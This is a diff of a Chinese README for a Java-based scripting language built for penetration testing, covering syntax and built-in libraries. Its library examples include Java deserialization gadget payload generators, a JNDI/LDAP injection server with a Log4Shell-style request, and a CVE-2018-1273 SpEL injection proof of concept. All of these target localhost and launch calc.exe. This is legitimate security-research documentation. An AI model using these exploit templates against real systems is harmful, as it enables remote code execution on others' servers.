@@ -3,18 +3,11 @@
 ## 介绍
 
 这是一个基于`Java`的脚本语言，主要面向渗透测试与安全研究人员，提供了一些简单高效的内置库
-
-大致原理
 1. 实现基于状态机的词法分析
 2. 巴科斯范式（BNF）生成抽象语法树
 3. 递归遍历抽象语法树执行代码
 
-功能介绍
-- 类型只有五种：字符串，数字，数组，哈希表，对象
-- 语法简洁：类似`Python`与`Golang`
-- 集成各种`Java`安全相关的库
-
-## 使用
+## 基础
 
 ### 01 Hello World
 
@@ -173,3 +166,229 @@ print(length(a));
 b = [1,2,3,4,5];
 print(length(b));
 ```
+
+## 库
+
+### 01 Base64库
+
+引入`base64`库即可进行编码解码操作
+
+```cpp
+#include "base64"
+
+data = "4ra1n";
+enc = base64::encode(data);
+print(enc);
+
+dec = base64::decode(enc);
+print(dec);
+
+decStr = toStr(dec);
+print(decStr);
+```
+
+### 02 String库
+
+一些常见的字符串操作
+
+```cpp
+#include "string"
+
+// isEmpty
+test = "hello world";
+if string::isEmpty(test)==false {
+    print("not null");
+}
+
+// contains
+if string::contains(test,"world") {
+    print("contains world")
+}
+
+// split
+split = string::split(test," ");
+len = length(split);
+i = 0;
+while i<len {
+    print(split[i]);
+    i = i + 1;
+}
+
+// substr
+sub = string::substr(test,1,4);
+print(sub);
+```
+
+### 03 HTTP库
+
+这也是最重要的库之一，基于`okhttp`实现
+
+支持直接`get`或`post`，也可以根据`Burp`的请求文件做请求
+
+```cpp
+#include "http"
+#include "string"
+
+// 请求头是Map类型
+headers = newMap();
+// 可以自行设置一些请求头（也可不设置）
+putMap(headers,"User-Agent","4ra1n");
+// URL
+url = "http://127.0.0.1:8080";
+// GET 请求
+response = http::doGet(url,headers);
+
+// POST 请求体
+body = "username=1&password=2"
+// 需要自行选择Content-Type
+// 默认支持form和json两种（也是最常见的两种）
+// form=application/x-www-form-urlencoded
+// json=application/form
+contentType = "form";
+// POST 请求
+http::doPost(url,headers,body,contentType);
+
+// 响应码
+code = getMap(response,"code");
+print("response code is: "+code);
+// 响应头也是Map类型
+respHeaders = getMap(response,"headers");
+// 从响应头中取值
+connection = getMap(respHeaders,"Connection")
+print("Connection: "+connection)
+// 获得响应体
+responseBody = getMap(response,"body");
+if string::contains(responseBody,"Tomcat")==true {
+    print("Tomcat")
+}
+
+// 使用请求报文
+req = readFile("1.txt");
+http::doRequest(req);
+```
+
+### 04 Tool库
+
+用于渗透测试相关：生成命令执行的`Payload`
+
+Java中直接执行命令会存在问题，所以需要特殊处理
+
+```cpp
+#include "tool"
+
+// 针对Bash的命令
+payload = tool::getBashCommand("calc.exe");
+print(payload);
+
+// 一种特殊的Payload
+payload = tool::getStringCommand("calc.exe");
+print(payload);
+
+// 针对Powershell的命令
+payload = tool::getPowershellCommand("calc.exe");
+print(payload);
+
+// 执行命令
+tool::exec(payload);
+```
+
+### 05 Payload库
+
+用于`Java`反序列化漏洞安全研究，生成各种`Gadget`的`Payload`
+
+返回的字符串已对结果进行`Base64`编码
+
+```cpp
+#include "payload"
+#include "tool"
+
+cmd = tool::getPowershellCommand("calc.exe");
+cc1 = payload::getCC1(cmd);
+print(cc1);
+
+cc2 = payload::getCC2(cmd);
+print(cc2);
+
+cc3 = payload::getCC3(cmd);
+print(cc3);
+
+cc4 = payload::getCC4(cmd);
+print(cc4);
+
+cc5 = payload::getCC5(cmd);
+print(cc5);
+
+cc6 = payload::getCC6(cmd);
+print(cc6);
+
+cc7 = payload::getCC7(cmd);
+print(cc7);
+
+cck1 = payload::getCCK1(cmd);
+print(cck1);
+
+cck2 = payload::getCCK2(cmd);
+print(cck2);
+
+cck3 = payload::getCCK3(cmd);
+print(cck3);
+
+cck4 = payload::getCCK4(cmd);
+print(cck4);
+```
+
+### 06 LDAP库
+
+这不是传统意义的`LDAP`服务端，而是针对于`JNDI`注入的服务端
+
+```cpp
+#include "ldap"
+#include "tool"
+#include "http"
+#include "base64"
+
+// LDAP服务端口
+ldapPort = 1389;
+// HTTP CodeBase端口
+httpPort = 8888;
+// 获取命令
+cmd = tool::getPowershellCommand("calc.exe");
+// 启动LDAP服务
+ldap::startServer(ldapPort,httpPort,cmd);
+
+// 针对于Log42Shell漏洞的POC
+headers = newMap();
+putMap(headers,"User-Agent","4ra1n");
+url = "http://127.0.0.1:8080/test?message=";
+payload = "${jndi:ldap://127.0.0.1:1389/cmd}";
+payload = base64::encode(payload);
+url = url + payload;
+response = http::doGet(url,headers);
+```
+
+### 07 案例一
+
+案例一：针对`CVE-2018-1273`的`POC`
+
+```cpp
+#include "http"
+
+// CVE-2018-1273
+// https://xz.aliyun.com/t/2269
+def poc(){
+    // application/x-www-form-urlencoded alias
+    contentType = "form";
+    // request body (only in post method)
+    body = "username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"calc.exe\")]";
+    // do http post request
+    http::doPost("http://127.0.0.1:8080/users",newMap(),body,contentType);
+}
+
+poc();
+```
+
+## 感谢
+
+一些底层的代码参考：《两周自制脚本语言》（人民邮电出版社）
+
+自己完善了书中的一些不足之处，并加入很多新的功能
